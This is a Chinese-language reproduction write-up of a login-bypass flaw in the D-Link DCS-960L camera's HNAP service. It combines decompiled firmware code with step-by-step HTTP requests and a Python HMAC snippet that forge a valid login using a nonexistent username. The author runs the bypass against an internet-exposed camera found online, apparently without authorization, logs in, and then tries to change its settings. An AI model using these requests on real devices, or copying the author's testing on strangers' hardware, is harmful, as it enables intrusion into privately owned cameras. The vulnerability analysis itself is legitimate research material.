# DCS-960L 登录验证绕过复现

DCS-960L 在 NHAP 服务运行 Login 时，对 username 没有异常错误处理，导致可以通过 request 得到公钥后，计算出不存在用户名的 LoginPassword 进行登录。

## 复现环境

* 漏洞固件 http://www.dlinktw.com.tw/techsupport/download.ashx?file=11617

  版本号为 v1.09

* qemu v5.2

* Ubuntu 18.04

* ida 7.5

## 漏洞分析

二进制文件在 `./web/cgi-bin/hnap/hnap_service` 的 Login 函数。

http header SOAPAction 设置为："http://purenetworks.com/HNAP1/GetModuleProfile" ； Cookie 设置为 request 返回的值 ；html 里面包含标签 `<Action>login</Action>` ，进入到下面的 login 处理流程：读取 html `Username` 和 `LoginPassword` 标签值作为用户名和密码，然后与服务器经过一系列运算后结果对比，一致则登录成功。

读取 Username 后，在路由器读取出对应的密码 db_password ，运算得出中间值 `key=o_pubilc_key+db_password` ，o_pubilc_key 是一个固定值，多次 request 返回都是一样的，o_pubilc_key 还与 challenge 相关。然后进行两轮 hmacmad5 运算得出密文与输入的 LoginPassword 比较，判断是否登录成功。hmac 加密用的秘钥：Challenge、PubilcKey 都是可以在 request 获取。

`hmac_md5(challenge, len_challenge, key, len_key, &v47);`、`hmac_md5(challenge, len_challenge, private_key, len_private_key, &v47);`

```c
				v15 = (const char *)ixmlGetElementValueByTag(v4, "Username");// 通过tag获取用户名密码
        v16 = (const char *)ixmlGetElementValueByTag(v4, "LoginPassword");
        if ( v15 )
        {
          strcpy((char *)v36, v15);
          if ( !strcmp((const char *)v36, "Admin") )
            snprintf((char *)v36, 0x20u, "%s", "admin");// Admin替换为admin
        }
        if ( v16 )
          strcpy((char *)v38, v16);
        challenge = (const char *)v36;
        fprintf(stderr, "username: %s\n", (const char *)v36);
        loginpassword = (const char *)v38;
        fprintf(stderr, "loginPassword: %s\n", (const char *)v38);
        key[0] = 0;
        key[1] = 0;
        key[2] = 0;
        key[3] = 0;
        key[4] = 0;
        key[5] = 0;
        key[6] = 0;
        key[7] = 0;
        key[8] = 0;
        key[9] = 0;
        key[10] = 0;
        key[11] = 0;
        key[12] = 0;
        v56 = 0;
        currect_password[0] = 0;
        currect_password[1] = 0;
        currect_password[2] = 0;
        currect_password[3] = 0;
        currect_password[4] = 0;
        currect_password[5] = 0;
        currect_password[6] = 0;
        currect_password[7] = 0;
        v52 = 0;
        db_password[0] = 0;
        db_password[1] = 0;
        db_password[2] = 0;
        db_password[3] = 0;
        db_password[4] = 0;
        db_password[5] = 0;
        db_password[6] = 0;
        db_password[7] = 0;
        v54 = 0;
        v47 = 0;
        v48 = 0;
        v49 = 0;
        v50 = 0;
        usrInit(0);
        usrGetPass(challenge, db_password, 0x21);// 数据库查询用户名对应密码db_password
        usrFree();
        public_key = (const char *)o_public_key;
        sprintf((char *)key, "%s%s", (const char *)o_public_key, (const char *)db_password);// key=o_pubilc_key+db_password
        challenge = (char *)&o_public_key[4] + 4;
        fprintf(stderr, "My challenge: %s\n", (const char *)&o_public_key[4] + 4);
        fprintf(stderr, "My public_key: %s\n", public_key);
        fprintf(stderr, "My password: %s\n", (const char *)db_password);
        len_challenge = strlen(challenge);
        len_key = strlen((const char *)key);
        hmac_md5(challenge, len_challenge, key, len_key, &v47);
        sprintf((char *)private_key, "%08X%08X%08X%08X", v47, v48, v49, v50);// 写入private_key
        fprintf(stderr, "My private_key: %s\n", (const char *)private_key);
        v47 = 0;
        v48 = 0;
        v49 = 0;
        v50 = 0;
        public_key = (const char *)strlen(challenge);
        len_private_key = strlen((const char *)private_key);
        hmac_md5(challenge, public_key, private_key, len_private_key, &v47);// hmac_md5(challenge, len_challenge, private_key, len_private_key, &v47);
        sprintf((char *)currect_password, "%08X%08X%08X%08X", v47, v48, v49, v50);
        fprintf(stderr, "My login_password: %s\n", (const char *)currect_password);
        v20 = strcmp(loginpassword, (const char *)currect_password) == 0;// 
                                                // loginpassword->输入的密码
        fprintf(stderr, "Check authStatus: %d\n", v20);// 验证成功返回值1
        v21 = v1;
        if ( v20 )
```

也就是如果知道用户名对应密码，先 request 获取秘钥和Cookie ，本地运算加密后的密码就能登录成功。由用户名获取的密码的函数 `usrGetPass` 在二进制文件：`usr/lib/libweb.so.0` 。

逻辑是将输入的 username 与 username_list 逐一 strcmp ，这个循环最多**22次**。**如果用户名不存在就会返回 -1 ，这是存储正确密码的局部变量 a2 为全 0** 。

```c
int __fastcall usrGetPass(const char *username, char *a2, size_t a3)
{
  int result; // $v0
  int v6; // $s3
  const char **v7; // $s2
  const char *each_name; // $v0
  int v9; // $v0
  size_t n; // [sp+18h] [-8h]

  if ( !*username )                             // username为空退出
    return -1;
  v6 = 0;
  v7 = (const char **)&username_list;
  while ( 1 )
  {
    each_name = *v7;
    v7 += 3;
    if ( each_name )
    {
      n = a3;
      v9 = strcmp(each_name, username);
      a3 = n;
      if ( !v9 )                                // 匹配打断循环
        break;
    }
    ++v6;
    result = -1;
    if ( v6 == 21 )                             // 循环22次没有找到就退出
      return result;
  }
  strncpy(a2, *((const char **)&password_list + 3 * v6 + 2), n);// strncpy(db_password,[password],0x21)
  return 1;
}
```

当返回值为 -1 时，login 并没有对应的异常错误处理，而是用空密码进行运算。

在用 qemu 尝试仿真，设置一系列变量后依然会卡在 main 函数调用 fwrite 将数据写入局部变量，进入 fwrite 后第一个参数（写入地址指针）会丢失变成 0 ，导致报错：

![image-20210218223146692](https://gitee.com/mrskye/Picbed/raw/master/img/20210218223152.png)

找一个公网上的 DCS-960L 测试一下，模仿正常登录过程：先发送一个 POST 包 request 公钥信息。

```
POST /HNAP1 HTTP/1.1
Host: xx.xx.xx.xx
Connection: close
Accept-Encoding: gzip, deflate
Pragma: no-cache
Cache-Control: no-cache
SOAPAction: "http://purenetworks.com/HNAP1/Login"
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Upgrade-Insecure-Requests: 1
Content-Length: 378

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username></Username><LoginPassword></LoginPassword></Login></soap:Body></soap:Envelope>
```

![image-20210218225310367](https://gitee.com/mrskye/Picbed/raw/master/img/20210218225310.png)

然后在本地用空秘钥运算出 LoginPassword ：

```python
import hmac
enc1 = hmac.new(public_key, challenge).hexdigest()
enc2 = hmac.new(enc1.upper(), challenge).hexdigest()
print("password: " + enc2)
```

补充上 cookie 和 loginpassword 标签，action 改为 login 登录：

```
POST /HNAP1 HTTP/1.1
Host: xx.xx.xx.xx
Connection: close
Cookie: uid=5Ae8c695b1;
Accept-Encoding: gzip, deflate
Pragma: no-cache
Cache-Control: no-cache
SOAPAction: "http://purenetworks.com/HNAP1/GetModuleProfile"
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Upgrade-Insecure-Requests: 1
Content-Length: 410

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>login</Action><Username>SKYE</Username><LoginPassword>C6F5148B44048218D1E8E2282C8F6EBB</LoginPassword></Login></soap:Body></soap:Envelope>
```

![image-20210218233358347](https://gitee.com/mrskye/Picbed/raw/master/img/20210218233358.png)

登录成功后，想试下 nhap 其他功能，比如设置路由器密码之类的，没整出来不知道是 xml 构造错了还是什么，一直返回 Login request 的数据。

## 参考文章

http://www.atomsec.org/%E5%AE%89%E5%85%A8/hacking-d-link-routers-with-hnap/

https://wzt.ac.cn/2021/01/17/DCS-960L/

https://www.4hou.com/posts/1QL0

https://xz.aliyun.com/t/2834#toc-3